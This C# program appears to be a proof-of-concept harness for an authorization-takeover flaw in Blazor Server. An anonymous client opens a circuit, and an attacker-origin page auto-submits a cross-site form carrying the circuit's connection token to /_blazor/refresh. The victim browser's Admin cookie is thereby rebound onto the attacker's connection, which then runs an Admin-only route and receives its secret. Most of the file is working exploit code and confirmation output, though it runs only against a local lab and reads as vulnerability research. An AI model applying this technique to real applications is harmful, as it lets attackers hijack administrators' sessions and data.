using System.Buffers;
using System.Collections.Concurrent;
using System.Diagnostics;
using System.Diagnostics.CodeAnalysis;
using System.Net;
using System.Security.Claims;
using System.Text.Encodings.Web;
using System.Text.Json;
using System.Text.RegularExpressions;
using Microsoft.AspNetCore.Authentication;
using Microsoft.AspNetCore.Authorization;
using Microsoft.AspNetCore.Components.Authorization;
using Microsoft.AspNetCore.Components.Server.Circuits;
using Microsoft.AspNetCore.Connections;
using Microsoft.AspNetCore.SignalR;
using Microsoft.AspNetCore.SignalR.Client;
using Microsoft.AspNetCore.SignalR.Protocol;
using Microsoft.Extensions.Options;
using BlazorRefreshLab.Components;

const string BaseUrl = "http://127.0.0.1:5088";
const string TargetBrowserUrl = "http://target.localtest.me:5088";
const string AttackerBrowserUrl = "http://attacker.localtest.me:5089";

var builder = WebApplication.CreateBuilder(args);
builder.WebHost.UseUrls("http://127.0.0.1:5088;http://127.0.0.1:5089");

builder.Services
    .AddAuthentication("Lab")
    .AddScheme<AuthenticationSchemeOptions, LabCookieAuthenticationHandler>("Lab", _ => { });

builder.Services.AddAuthorization(options =>
{
    options.AddPolicy("AdminOnly", policy => policy.RequireRole("Admin"));
});

builder.Services.AddCascadingAuthenticationState();
builder.Services
    .AddRazorComponents()
    .AddInteractiveServerComponents(options => options.DetailedErrors = true);

builder.Services.AddSingleton<ObservedCircuitIdentityStore>();
builder.Services.AddSingleton<BrowserCsrfObservation>();
builder.Services.AddSingleton<AdminOperationProbe>();
builder.Services.AddScoped<CircuitHandler, IdentityObservingCircuitHandler>();

var app = builder.Build();
var browserObservation = app.Services.GetRequiredService<BrowserCsrfObservation>();
var adminProbe = app.Services.GetRequiredService<AdminOperationProbe>();

app.Use(async (context, next) =>
{
    var isBrowserRefresh =
        context.Request.Path.Equals("/_blazor/refresh", StringComparison.Ordinal)
        && string.Equals(context.Request.Host.Host, "target.localtest.me", StringComparison.OrdinalIgnoreCase);

    if (isBrowserRefresh)
    {
        browserObservation.RefreshOrigin = context.Request.Headers.Origin.ToString();
        browserObservation.RefreshSawVictimCookie =
            string.Equals(context.Request.Cookies["LabAuth"], "browser-victim", StringComparison.Ordinal);
        browserObservation.RefreshSawAdminRoleCookie =
            string.Equals(context.Request.Cookies["LabRole"], "Admin", StringComparison.Ordinal);
    }

    await next();

    if (isBrowserRefresh)
    {
        browserObservation.RefreshStatusCode = context.Response.StatusCode;
    }
});

app.UseRouting();
app.UseAuthentication();
app.UseAuthorization();

app.MapHub<ControlHub>("/control", options => options.EnableAuthenticationRefresh = true);

app.MapGet("/health", () => Results.Text("OK")).AllowAnonymous();

app.MapGet("/browser-login", (HttpContext context) =>
{
    var cookieOptions = new CookieOptions
    {
        HttpOnly = true,
        SameSite = SameSiteMode.Lax,
        Secure = false,
        Path = "/",
        MaxAge = TimeSpan.FromHours(1),
        Expires = DateTimeOffset.UtcNow.AddHours(1),
    };

    context.Response.Cookies.Append("LabAuth", "browser-victim", cookieOptions);
    context.Response.Cookies.Append("LabRole", "Admin", cookieOptions);

    return Results.Content(
        "<!doctype html><title>victim admin session established</title><p>victim admin session established</p>",
        "text/html");
}).AllowAnonymous();

app.MapGet("/attack", (HttpContext context) =>
{
    browserObservation.AttackPageSawVictimCookie =
        string.Equals(context.Request.Cookies["LabAuth"], "browser-victim", StringComparison.Ordinal)
        || string.Equals(context.Request.Cookies["LabRole"], "Admin", StringComparison.Ordinal);

    var token = context.Request.Query["token"].ToString();
    if (string.IsNullOrWhiteSpace(token))
    {
        return Results.BadRequest("missing token");
    }

    var action = TargetBrowserUrl + "/_blazor/refresh?id=" + Uri.EscapeDataString(token);
    var html = $"""
        <!doctype html>
        <html>
        <head><title>attacker origin</title></head>
        <body>
          <form id="attack" method="post" action="{HtmlEncoder.Default.Encode(action)}"></form>
          <script>document.getElementById('attack').submit();</script>
        </body>
        </html>
        """;

    return Results.Content(html, "text/html");
}).AllowAnonymous();

app.MapRazorComponents<App>()
    .AddInteractiveServerRenderMode();

await app.StartAsync();

try
{
    var observed = app.Services.GetRequiredService<ObservedCircuitIdentityStore>();

    // Obtain a genuine server-generated InteractiveServer component descriptor.
    using var bootstrapClient = new HttpClient();
    using var bootstrapRequest = new HttpRequestMessage(HttpMethod.Get, BaseUrl + "/");
    bootstrapRequest.Headers.Host = "target.localtest.me:5088";
    using var bootstrapResponse = await bootstrapClient.SendAsync(bootstrapRequest);
    bootstrapResponse.EnsureSuccessStatusCode();
    var bootstrapHtml = await bootstrapResponse.Content.ReadAsStringAsync();

    var initialComponentsJson = ExtractServerComponentRecords(bootstrapHtml);
    Console.WriteLine($"SERVER_COMPONENT_DESCRIPTOR_COUNT={JsonDocument.Parse(initialComponentsJson).RootElement.GetArrayLength()}");

    // ---------------------------------------------------------------------
    // Anonymous attacker owns a genuine Blazor circuit.
    // ---------------------------------------------------------------------
    string? attackerConnectionToken = null;
    var attackerBuilder = new HubConnectionBuilder()
        .WithUrl(BaseUrl + "/_blazor", options =>
        {
            options.HttpMessageHandlerFactory = inner =>
                new NegotiateCaptureHandler(inner, token => attackerConnectionToken = token);
        });
    attackerBuilder.Services.AddSingleton<IHubProtocol>(new BlazorPackClientProtocol());

    await using var attackerConnection = attackerBuilder.Build();
    await attackerConnection.StartAsync();

    if (string.IsNullOrWhiteSpace(attackerConnectionToken))
    {
        throw new InvalidOperationException("Failed to capture anonymous attacker connection token.");
    }

    var anonymousBefore = observed.Count("anonymous");
    var circuitSecret = await attackerConnection.InvokeAsync<string>(
        "StartCircuit",
        TargetBrowserUrl + "/",
        TargetBrowserUrl + "/",
        initialComponentsJson,
        "");

    if (string.IsNullOrWhiteSpace(circuitSecret))
    {
        throw new InvalidOperationException("Failed to start genuine attacker Blazor circuit.");
    }

    await observed.WaitForCountAsync("anonymous", anonymousBefore + 1, TimeSpan.FromSeconds(10));

    Console.WriteLine("ANONYMOUS_ATTACKER_CIRCUIT_STARTED=CONFIRMED");
    Console.WriteLine($"ANONYMOUS_ATTACKER_CONNECTION_TOKEN_CAPTURED={attackerConnectionToken.Length > 20}");
    Console.WriteLine($"ANONYMOUS_ATTACKER_CONNECTION_STATE={attackerConnection.State}");

    if (adminProbe.Count != 0)
    {
        throw new InvalidOperationException("Admin component executed before any navigation.");
    }

    // Negative control: before the victim is rebound, an anonymous attacker cannot instantiate
    // the [Authorize(Roles = "Admin")] route.
    await attackerConnection.SendAsync(
        "OnLocationChanged",
        TargetBrowserUrl + "/admin",
        null,
        false);

    await Task.Delay(500);

    Console.WriteLine($"ADMIN_PROBE_BEFORE_REBIND={adminProbe.Count}");
    if (adminProbe.Count != 0)
    {
        throw new InvalidOperationException("Anonymous attacker reached the Admin route before rebind.");
    }

    await attackerConnection.SendAsync(
        "OnLocationChanged",
        TargetBrowserUrl + "/",
        null,
        false);

    // ---------------------------------------------------------------------
    // Causal control: normal SignalR rejects anonymous -> victim transition.
    // ---------------------------------------------------------------------
    string? controlToken = null;
    await using var controlConnection = new HubConnectionBuilder()
        .WithUrl(BaseUrl + "/control", options =>
        {
            options.HttpMessageHandlerFactory = inner =>
                new NegotiateCaptureHandler(inner, token => controlToken = token);
        })
        .Build();

    await controlConnection.StartAsync();

    if (string.IsNullOrWhiteSpace(controlToken))
    {
        throw new InvalidOperationException("Failed to capture control token.");
    }

    using var manualVictimClient = new HttpClient(new HttpClientHandler
    {
        UseCookies = false,
        AllowAutoRedirect = false,
    });

    using var normalControlRefresh = new HttpRequestMessage(
        HttpMethod.Post,
        BaseUrl + "/control/refresh?id=" + Uri.EscapeDataString(controlToken));
    normalControlRefresh.Headers.TryAddWithoutValidation(
        "Cookie",
        "LabAuth=browser-victim; LabRole=Admin");

    using var normalControlResponse = await manualVictimClient.SendAsync(normalControlRefresh);
    var normalControlBody = await normalControlResponse.Content.ReadAsStringAsync();

    Console.WriteLine($"NORMAL_SIGNALR_CROSS_USER_REFRESH_STATUS={(int)normalControlResponse.StatusCode}");
    Console.WriteLine($"NORMAL_SIGNALR_CROSS_USER_REFRESH_BODY={normalControlBody}");

    if (normalControlResponse.StatusCode != HttpStatusCode.Forbidden
        || !normalControlBody.Contains("user_changed", StringComparison.Ordinal))
    {
        throw new InvalidOperationException("Normal SignalR did not reject anonymous -> victim Admin refresh.");
    }

    Console.WriteLine("NORMAL_SIGNALR_SAME_ATTACK_REJECTED_403=CONFIRMED");

    // ---------------------------------------------------------------------
    // Real browser delivery: victim only visits attacker origin.
    // ---------------------------------------------------------------------
    var chrome = FindChromeExecutable();
    var profileDir = Path.Combine(
        Path.GetTempPath(),
        "blazor-critical-victim-" + Guid.NewGuid().ToString("N"));
    Directory.CreateDirectory(profileDir);

    var loginRun = await RunChromeAsync(chrome, profileDir, TargetBrowserUrl + "/browser-login");
    Console.WriteLine($"VICTIM_BROWSER_LOGIN_EXIT={loginRun.ExitCode}");
    if (loginRun.ExitCode != 0)
    {
        Console.WriteLine(loginRun.StdErr);
        throw new InvalidOperationException("Victim browser failed to establish Admin session.");
    }

    var attackUrl =
        AttackerBrowserUrl
        + "/attack?token="
        + Uri.EscapeDataString(attackerConnectionToken);

    var victimBefore = observed.Count("browser-victim");
    var attackRun = await RunChromeAsync(chrome, profileDir, attackUrl);

    Console.WriteLine($"VICTIM_ATTACK_PAGE_EXIT={attackRun.ExitCode}");
    if (attackRun.ExitCode != 0)
    {
        Console.WriteLine(attackRun.StdErr);
        throw new InvalidOperationException("Victim browser attack navigation failed.");
    }

    await observed.WaitForCountAsync(
        "browser-victim",
        victimBefore + 1,
        TimeSpan.FromSeconds(10));

    Console.WriteLine($"ATTACK_PAGE_SAW_TARGET_COOKIE={browserObservation.AttackPageSawVictimCookie}");
    Console.WriteLine($"REFRESH_ORIGIN={browserObservation.RefreshOrigin}");
    Console.WriteLine($"REFRESH_SAW_VICTIM_COOKIE={browserObservation.RefreshSawVictimCookie}");
    Console.WriteLine($"REFRESH_SAW_ADMIN_COOKIE={browserObservation.RefreshSawAdminRoleCookie}");
    Console.WriteLine($"REFRESH_STATUS={browserObservation.RefreshStatusCode}");
    Console.WriteLine($"ATTACKER_CONNECTION_AFTER_REBIND={attackerConnection.State}");

    if (browserObservation.AttackPageSawVictimCookie)
    {
        throw new InvalidOperationException("Host-only victim cookie leaked to attacker sibling origin.");
    }

    if (!browserObservation.RefreshSawVictimCookie
        || !browserObservation.RefreshSawAdminRoleCookie
        || browserObservation.RefreshStatusCode != StatusCodes.Status200OK
        || !string.Equals(browserObservation.RefreshOrigin, AttackerBrowserUrl, StringComparison.Ordinal))
    {
        throw new InvalidOperationException("Real-browser victim Admin refresh preconditions did not hold.");
    }

    if (attackerConnection.State != HubConnectionState.Connected)
    {
        throw new InvalidOperationException("Anonymous attacker lost their live Blazor connection after victim rebind.");
    }

    Console.WriteLine("REMOTE_ANONYMOUS_ATTACKER_REBOUND_TO_VICTIM_ADMIN=CONFIRMED");
    Console.WriteLine("SAMESITE_LAX_BROWSER_DELIVERY=CONFIRMED");
    Console.WriteLine("ATTACKER_CONNECTION_REMAINS_CONNECTED=CONFIRMED");

    // ---------------------------------------------------------------------
    // Complete impact chain: same attacker connection now navigates to a
    // standard Blazor [Authorize(Roles = "Admin")] route.
    // ---------------------------------------------------------------------
    var adminBefore = adminProbe.Count;

    await attackerConnection.SendAsync(
        "OnLocationChanged",
        TargetBrowserUrl + "/admin",
        null,
        false);

    var adminExecution = await adminProbe.WaitForExecutionAsync(
        minimumCount: adminBefore + 1,
        timeout: TimeSpan.FromSeconds(10));

    Console.WriteLine($"ADMIN_PROBE_AFTER_REBIND={adminProbe.Count}");
    Console.WriteLine($"ADMIN_PROBE_LAST_USER={adminExecution.User}");
    Console.WriteLine($"ADMIN_PROBE_LAST_IS_ADMIN={adminExecution.IsAdmin}");
    Console.WriteLine($"ADMIN_PROBE_SECRET={adminExecution.Secret}");
    Console.WriteLine($"ATTACKER_CONNECTION_AFTER_ADMIN_NAV={attackerConnection.State}");

    if (adminExecution.User != "browser-victim"
        || !adminExecution.IsAdmin
        || adminExecution.Secret != AdminOperationProbe.AdminSecret
        || attackerConnection.State != HubConnectionState.Connected)
    {
        throw new InvalidOperationException("Victim Admin authorization was not usable on the attacker-owned circuit.");
    }

    Console.WriteLine("AUTHORIZED_ADMIN_ROUTE_EXECUTED_ON_ATTACKER_CONNECTION=CONFIRMED");
    Console.WriteLine("VICTIM_ADMIN_SECRET_REACHED_ATTACKER_OWNED_CIRCUIT=CONFIRMED");
    Console.WriteLine("REMOTE_ANONYMOUS_TO_VICTIM_ADMIN_AUTHORIZATION_CONTEXT_TAKEOVER=CONFIRMED");
    Console.WriteLine("CRITICAL_SEVERITY_CHAIN_EVIDENCE=PASS");
}
finally
{
    await app.StopAsync();
}

static string ExtractServerComponentRecords(string html)
{
    var records = new List<JsonElement>();

    foreach (Match match in Regex.Matches(
        html,
        @"<!--\s*Blazor:(?<json>\{.*?\})\s*-->",
        RegexOptions.Singleline | RegexOptions.CultureInvariant))
    {
        using var doc = JsonDocument.Parse(match.Groups["json"].Value);
        var root = doc.RootElement;

        if (root.TryGetProperty("type", out var type)
            && string.Equals(type.GetString(), "server", StringComparison.Ordinal)
            && root.TryGetProperty("descriptor", out _)
            && root.TryGetProperty("sequence", out _))
        {
            records.Add(root.Clone());
        }
    }

    if (records.Count == 0)
    {
        throw new InvalidOperationException("No genuine InteractiveServer component descriptor found in prerendered HTML.");
    }

    return JsonSerializer.Serialize(records);
}

static string FindChromeExecutable()
{
    string[] candidates =
    [
        "/usr/bin/google-chrome",
        "/usr/bin/google-chrome-stable",
        "/usr/bin/chromium",
        "/usr/bin/chromium-browser",
    ];

    return candidates.FirstOrDefault(File.Exists)
        ?? throw new FileNotFoundException("No Chromium/Chrome executable found.");
}

static async Task<(int ExitCode, string StdOut, string StdErr)> RunChromeAsync(
    string executable,
    string profileDir,
    string url)
{
    using var process = new Process();
    process.StartInfo = new ProcessStartInfo
    {
        FileName = executable,
        UseShellExecute = false,
        RedirectStandardOutput = true,
        RedirectStandardError = true,
    };

    process.StartInfo.ArgumentList.Add("--headless=new");
    process.StartInfo.ArgumentList.Add("--no-sandbox");
    process.StartInfo.ArgumentList.Add("--disable-gpu");
    process.StartInfo.ArgumentList.Add("--disable-dev-shm-usage");
    process.StartInfo.ArgumentList.Add("--no-proxy-server");
    process.StartInfo.ArgumentList.Add(
        "--host-resolver-rules=MAP target.localtest.me 127.0.0.1, MAP attacker.localtest.me 127.0.0.1");
    process.StartInfo.ArgumentList.Add("--user-data-dir=" + profileDir);
    process.StartInfo.ArgumentList.Add("--dump-dom");
    process.StartInfo.ArgumentList.Add(url);

    process.Start();
    var stdoutTask = process.StandardOutput.ReadToEndAsync();
    var stderrTask = process.StandardError.ReadToEndAsync();

    await process.WaitForExitAsync();
    return (process.ExitCode, await stdoutTask, await stderrTask);
}

sealed class LabCookieAuthenticationHandler : AuthenticationHandler<AuthenticationSchemeOptions>
{
    public LabCookieAuthenticationHandler(
        IOptionsMonitor<AuthenticationSchemeOptions> options,
        ILoggerFactory logger,
        UrlEncoder encoder)
        : base(options, logger, encoder)
    {
    }

    protected override Task<AuthenticateResult> HandleAuthenticateAsync()
    {
        var cookie = Request.Headers.Cookie.ToString();
        var parts = cookie.Split(
            ';',
            StringSplitOptions.RemoveEmptyEntries | StringSplitOptions.TrimEntries);

        var authPart = parts.FirstOrDefault(
            x => x.StartsWith("LabAuth=", StringComparison.Ordinal));

        if (authPart is null)
        {
            return Task.FromResult(AuthenticateResult.NoResult());
        }

        var user = authPart["LabAuth=".Length..];
        if (string.IsNullOrWhiteSpace(user))
        {
            return Task.FromResult(AuthenticateResult.NoResult());
        }

        var claims = new List<Claim>
        {
            new(ClaimTypes.Name, user),
            new(ClaimTypes.NameIdentifier, user),
            new("sub", user),
        };

        var rolePart = parts.FirstOrDefault(
            x => x.StartsWith("LabRole=", StringComparison.Ordinal));

        if (rolePart is not null)
        {
            var role = rolePart["LabRole=".Length..];
            if (!string.IsNullOrWhiteSpace(role))
            {
                claims.Add(new Claim(ClaimTypes.Role, role));
            }
        }

        var identity = new ClaimsIdentity(claims, Scheme.Name);
        return Task.FromResult(
            AuthenticateResult.Success(
                new AuthenticationTicket(
                    new ClaimsPrincipal(identity),
                    Scheme.Name)));
    }
}

sealed class ObservedCircuitIdentityStore
{
    private readonly ConcurrentQueue<string> _events = new();
    private readonly ConcurrentDictionary<string, TaskCompletionSource<string>> _waiters = new();

    public void Record(ClaimsPrincipal principal)
    {
        var name = principal.Identity?.IsAuthenticated == true
            ? principal.Identity.Name ?? "(authenticated-no-name)"
            : "anonymous";

        _events.Enqueue(name);

        if (_waiters.TryGetValue(name, out var waiter))
        {
            waiter.TrySetResult(name);
        }
    }

    public int Count(string user) =>
        _events.Count(x => string.Equals(x, user, StringComparison.Ordinal));

    public async Task WaitForCountAsync(string user, int expectedCount, TimeSpan timeout)
    {
        using var cts = new CancellationTokenSource(timeout);
        while (Count(user) < expectedCount)
        {
            await Task.Delay(25, cts.Token);
        }
    }
}

sealed class IdentityObservingCircuitHandler : CircuitHandler
{
    private readonly AuthenticationStateProvider _authenticationStateProvider;
    private readonly ObservedCircuitIdentityStore _store;

    public IdentityObservingCircuitHandler(
        AuthenticationStateProvider authenticationStateProvider,
        ObservedCircuitIdentityStore store)
    {
        _authenticationStateProvider = authenticationStateProvider;
        _store = store;
    }

    public override async Task OnCircuitOpenedAsync(
        Circuit circuit,
        CancellationToken cancellationToken)
    {
        var initial = await _authenticationStateProvider.GetAuthenticationStateAsync();
        _store.Record(initial.User);

        _authenticationStateProvider.AuthenticationStateChanged += task =>
        {
            _ = ObserveAsync(task);
        };
    }

    private async Task ObserveAsync(Task<AuthenticationState> task)
    {
        var state = await task;
        Console.WriteLine(
            $"CIRCUIT_AUTH_CHANGED={state.User.Identity?.Name ?? "anonymous"};ADMIN={state.User.IsInRole("Admin")}");
        _store.Record(state.User);
    }
}

sealed class BrowserCsrfObservation
{
    public bool AttackPageSawVictimCookie { get; set; }
    public string RefreshOrigin { get; set; } = string.Empty;
    public bool RefreshSawVictimCookie { get; set; }
    public bool RefreshSawAdminRoleCookie { get; set; }
    public int RefreshStatusCode { get; set; }
}

sealed class AdminOperationProbe
{
    public const string AdminSecret = "RESEARCH_ADMIN_SECRET_9E4B1D";

    private readonly object _gate = new();
    private int _count;
    private AdminExecution? _last;
    private TaskCompletionSource<AdminExecution> _signal =
        new(TaskCreationOptions.RunContinuationsAsynchronously);

    public int Count => Volatile.Read(ref _count);

    public void Record(string user, bool isAdmin)
    {
        var result = new AdminExecution(
            Interlocked.Increment(ref _count),
            user,
            isAdmin,
            AdminSecret);

        lock (_gate)
        {
            _last = result;
            _signal.TrySetResult(result);
        }
    }

    public async Task<AdminExecution> WaitForExecutionAsync(int minimumCount, TimeSpan timeout)
    {
        while (true)
        {
            Task<AdminExecution> task;
            lock (_gate)
            {
                if (_last is { } last && last.Count >= minimumCount)
                {
                    return last;
                }

                if (_signal.Task.IsCompleted)
                {
                    _signal = new(
                        TaskCreationOptions.RunContinuationsAsynchronously);
                }

                task = _signal.Task;
            }

            var observed = await task.WaitAsync(timeout);
            if (observed.Count >= minimumCount)
            {
                return observed;
            }
        }
    }
}

sealed record AdminExecution(int Count, string User, bool IsAdmin, string Secret);

sealed class NegotiateCaptureHandler : DelegatingHandler
{
    private readonly Action<string> _capture;

    public NegotiateCaptureHandler(HttpMessageHandler inner, Action<string> capture)
        : base(inner)
    {
        _capture = capture;
    }

    protected override async Task<HttpResponseMessage> SendAsync(
        HttpRequestMessage request,
        CancellationToken cancellationToken)
    {
        var response = await base.SendAsync(request, cancellationToken);

        if (request.RequestUri?.AbsolutePath.EndsWith(
                "/negotiate",
                StringComparison.Ordinal) == true
            && response.Content is not null)
        {
            var bytes = await response.Content.ReadAsByteArrayAsync(cancellationToken);
            var originalHeaders = response.Content.Headers
                .ToDictionary(x => x.Key, x => x.Value.ToArray());

            using (var doc = JsonDocument.Parse(bytes))
            {
                if (doc.RootElement.TryGetProperty("connectionToken", out var token)
                    && token.GetString() is { Length: > 0 } value)
                {
                    _capture(value);
                }
            }

            var replacement = new ByteArrayContent(bytes);
            foreach (var header in originalHeaders)
            {
                replacement.Headers.TryAddWithoutValidation(header.Key, header.Value);
            }

            response.Content = replacement;
        }

        return response;
    }
}

sealed class BlazorPackClientProtocol : IHubProtocol
{
    private readonly MessagePackHubProtocol _inner = new();

    public string Name => "blazorpack";
    public int Version => 2;
    public TransferFormat TransferFormat => TransferFormat.Binary;

    public bool IsVersionSupported(int version) => version <= Version;

    public bool TryParseMessage(
        ref ReadOnlySequence<byte> input,
        IInvocationBinder binder,
        [NotNullWhen(true)] out HubMessage? message) =>
        _inner.TryParseMessage(ref input, binder, out message);

    public void WriteMessage(HubMessage message, IBufferWriter<byte> output) =>
        _inner.WriteMessage(message, output);

    public ReadOnlyMemory<byte> GetMessageBytes(HubMessage message) =>
        _inner.GetMessageBytes(message);
}

sealed class ControlHub : Hub
{
}
